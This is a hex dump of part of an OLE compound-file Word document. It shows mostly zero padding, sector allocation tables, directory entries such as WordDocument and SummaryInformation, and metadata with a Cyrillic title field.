0000e530: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e540: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e550: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e560: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e570: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e580: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e590: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e5a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e5b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e5c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e5d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e5e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e5f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e600: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e610: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e620: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e630: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e640: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e650: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e660: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e670: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e680: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e690: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e6a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e6b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e6c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e6d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e6e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e6f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e700: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e710: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e720: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e730: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e740: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e750: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e760: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e770: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e780: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e790: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e7a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e7b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e7c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e7d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e7e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e7f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e800: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e810: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e820: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e830: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e840: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e850: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e860: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e870: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e880: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e890: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e8a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e8b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e8c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e8d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e8e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e8f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e900: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e910: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e920: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e930: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e940: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e950: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e960: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e970: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e980: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e990: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e9a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e9b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e9c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e9d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e9e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000e9f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ea00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ea10: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ea20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ea30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ea40: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ea50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ea60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ea70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ea80: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ea90: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eaa0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eab0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eac0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ead0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eae0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eaf0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eb00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eb10: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eb20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eb30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eb40: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eb50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eb60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eb70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eb80: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eb90: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eba0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ebb0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ebc0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ebd0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ebe0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ebf0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ec00: feff 0000 0a00 0200 0000 0000 0000 0000  ................
0000ec10: 0000 0000 0000 0000 0100 0000 02d5 cdd5  ................
0000ec20: 9c2e 1b10 9397 0800 2b2c f9ae 3000 0000  ........+,..0...
0000ec30: 2001 0000 0c00 0000 0100 0000 6800 0000   ...........h...
0000ec40: 0f00 0000 7000 0000 0500 0000 8c00 0000  ....p...........
0000ec50: 0600 0000 9400 0000 1100 0000 9c00 0000  ................
0000ec60: 1700 0000 a400 0000 0b00 0000 ac00 0000  ................
0000ec70: 1000 0000 b400 0000 1300 0000 bc00 0000  ................
0000ec80: 1600 0000 c400 0000 0d00 0000 cc00 0000  ................
0000ec90: 0c00 0000 de00 0000 0200 0000 e9fd 0000  ................
0000eca0: 1e00 0000 1400 0000 5350 6563 6961 6c69  ........SPeciali
0000ecb0: 5354 2052 6550 6163 6b00 0000 0300 0000  ST RePack.......
0000ecc0: 0300 0000 0300 0000 0100 0000 0300 0000  ................
0000ecd0: d701 0000 0300 0000 0000 1000 0b00 0000  ................
0000ece0: 0000 0000 0b00 0000 0000 0000 0b00 0000  ................
0000ecf0: 0000 0000 0b00 0000 0000 0000 1e10 0000  ................
0000ed00: 0200 0000 0100 0000 0001 0000 0000 0c10  ................
0000ed10: 0000 0400 0000 1e00 0000 0600 0000 5469  ..............Ti
0000ed20: 746c 6500 0300 0000 0100 0000 1e00 0000  tle.............
0000ed30: 1100 0000 d09d d0b0 d0b7 d0b2 d0b0 d0bd  ................
0000ed40: d0b8 d0b5 0003 0000 0001 0000 0000 0000  ................
0000ed50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ed60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ed70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ed80: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ed90: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eda0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000edb0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000edc0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000edd0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ede0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000edf0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ee00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ee10: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ee20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ee30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ee40: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ee50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ee60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ee70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ee80: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ee90: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eea0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eeb0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eec0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eed0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eee0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eef0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ef00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ef10: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ef20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ef30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ef40: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ef50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ef60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ef70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ef80: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ef90: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000efa0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000efb0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000efc0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000efd0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000efe0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000eff0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f000: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f010: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f020: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f030: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f040: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f050: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f060: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f070: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f080: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f090: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f0a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f0b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f0c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f0d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f0e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f0f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f100: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f110: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f120: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f130: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f140: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f150: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f160: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f170: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f180: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f190: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f1a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f1b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f1c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f1d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f1e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f1f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f200: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f210: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f220: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f230: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f240: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f250: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f260: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f270: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f280: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f290: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f2a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f2b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f2c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f2d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f2e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f2f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f300: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f310: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f320: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f330: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f340: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f350: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f360: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f370: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f380: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f390: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f3a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f3b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f3c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f3d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f3e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f3f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f400: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f410: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f420: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f430: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f440: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f450: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f460: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f470: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f480: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f490: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f4a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f4b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f4c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f4d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f4e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f4f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f500: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f510: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f520: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f530: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f540: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f550: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f560: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f570: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f580: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f590: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f5a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f5b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f5c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f5d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f5e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f5f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f600: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f610: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f620: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f630: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f640: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f650: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f660: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f670: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f680: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f690: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f6a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f6b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f6c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f6d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f6e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f6f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f700: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f710: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f720: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f730: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f740: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f750: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f760: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f770: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f780: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f790: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f7a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f7b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f7c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f7d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f7e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f7f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f800: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f810: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f820: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f830: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f840: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f850: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f860: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f870: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f880: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f890: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f8a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f8b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f8c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f8d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f8e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f8f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f900: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f910: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f920: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f930: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f940: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f950: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f960: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f970: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f980: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f990: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f9a0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f9b0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f9c0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f9d0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f9e0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000f9f0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fa00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fa10: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fa20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fa30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fa40: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fa50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fa60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fa70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fa80: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fa90: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000faa0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fab0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fac0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fad0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fae0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000faf0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fb00: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fb10: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fb20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fb30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fb40: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fb50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fb60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fb70: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fb80: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fb90: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fba0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fbb0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fbc0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fbd0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fbe0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fbf0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fc00: 0100 0000 0200 0000 0300 0000 0400 0000  ................
0000fc10: 0500 0000 0600 0000 0700 0000 0800 0000  ................
0000fc20: 0900 0000 0a00 0000 0b00 0000 0c00 0000  ................
0000fc30: 0d00 0000 0e00 0000 0f00 0000 1000 0000  ................
0000fc40: 1100 0000 1200 0000 1300 0000 1400 0000  ................
0000fc50: 1500 0000 1600 0000 1700 0000 1800 0000  ................
0000fc60: 1900 0000 1a00 0000 1b00 0000 1c00 0000  ................
0000fc70: 1d00 0000 1e00 0000 1f00 0000 2000 0000  ............ ...
0000fc80: 2100 0000 2200 0000 2300 0000 2400 0000  !..."...#...$...
0000fc90: 2500 0000 2600 0000 2700 0000 2800 0000  %...&...'...(...
0000fca0: 2900 0000 2a00 0000 2b00 0000 2c00 0000  )...*...+...,...
0000fcb0: 2d00 0000 2e00 0000 2f00 0000 3000 0000  -......./...0...
0000fcc0: 3100 0000 3200 0000 3300 0000 3400 0000  1...2...3...4...
0000fcd0: 3500 0000 3600 0000 3700 0000 3800 0000  5...6...7...8...
0000fce0: 3900 0000 3a00 0000 3b00 0000 3c00 0000  9...:...;...<...
0000fcf0: 3d00 0000 3e00 0000 3f00 0000 4000 0000  =...>...?...@...
0000fd00: 4100 0000 4200 0000 4300 0000 4400 0000  A...B...C...D...
0000fd10: 4500 0000 4600 0000 4700 0000 4800 0000  E...F...G...H...
0000fd20: feff ffff 4a00 0000 4b00 0000 4c00 0000  ....J...K...L...
0000fd30: 4d00 0000 4e00 0000 4f00 0000 5000 0000  M...N...O...P...
0000fd40: 5100 0000 5200 0000 5300 0000 5400 0000  Q...R...S...T...
0000fd50: 5500 0000 5600 0000 5700 0000 5800 0000  U...V...W...X...
0000fd60: 5900 0000 5a00 0000 5b00 0000 5c00 0000  Y...Z...[...\...
0000fd70: 5d00 0000 5e00 0000 5f00 0000 6000 0000  ]...^..._...`...
0000fd80: 6100 0000 6200 0000 6300 0000 6400 0000  a...b...c...d...
0000fd90: 6500 0000 6600 0000 6700 0000 6800 0000  e...f...g...h...
0000fda0: 6900 0000 6a00 0000 6b00 0000 6c00 0000  i...j...k...l...
0000fdb0: feff ffff 6e00 0000 6f00 0000 7000 0000  ....n...o...p...
0000fdc0: 7100 0000 7200 0000 7300 0000 7400 0000  q...r...s...t...
0000fdd0: feff ffff 7600 0000 7700 0000 7800 0000  ....v...w...x...
0000fde0: 7900 0000 7a00 0000 7b00 0000 7c00 0000  y...z...{...|...
0000fdf0: feff ffff fdff ffff 7f00 0000 8900 0000  ................
0000fe00: 5200 6f00 6f00 7400 2000 4500 6e00 7400  R.o.o.t. .E.n.t.
0000fe10: 7200 7900 0000 0000 0000 0000 0000 0000  r.y.............
0000fe20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fe30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fe40: 1600 0501 ffff ffff ffff ffff 0300 0000  ................
0000fe50: 0609 0200 0000 0000 c000 0000 0000 0046  ...............F
0000fe60: 0000 0000 0000 0000 0000 0000 80d3 5de6  ..............].
0000fe70: c08b d801 8200 0000 402d 0000 0000 0000  ........@-......
0000fe80: 3100 5400 6100 6200 6c00 6500 0000 0000  1.T.a.b.l.e.....
0000fe90: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fea0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000feb0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fec0: 0e00 0200 ffff ffff ffff ffff ffff ffff  ................
0000fed0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fee0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fef0: 0000 0000 4900 0000 1346 0000 0000 0000  ....I....F......
0000ff00: 5700 6f00 7200 6400 4400 6f00 6300 7500  W.o.r.d.D.o.c.u.
0000ff10: 6d00 6500 6e00 7400 0000 0000 0000 0000  m.e.n.t.........
0000ff20: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ff30: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ff40: 1a00 0201 0500 0000 ffff ffff ffff ffff  ................
0000ff50: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ff60: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ff70: 0000 0000 0000 0000 6091 0000 0000 0000  ........`.......
0000ff80: 0500 5300 7500 6d00 6d00 6100 7200 7900  ..S.u.m.m.a.r.y.
0000ff90: 4900 6e00 6600 6f00 7200 6d00 6100 7400  I.n.f.o.r.m.a.t.
0000ffa0: 6900 6f00 6e00 0000 0000 0000 0000 0000  i.o.n...........
0000ffb0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ffc0: 2800 0201 0200 0000 0400 0000 ffff ffff  (...............
0000ffd0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000ffe0: 0000 0000 0000 0000 0000 0000 0000 0000  ................
0000fff0: 0000 0000 6d00 0000 0010 0000 0000 0000  ....m...........
00010000: 0500 4400 6f00 6300 7500 6d00 6500 6e00  ..D.o.c.u.m.e.n.
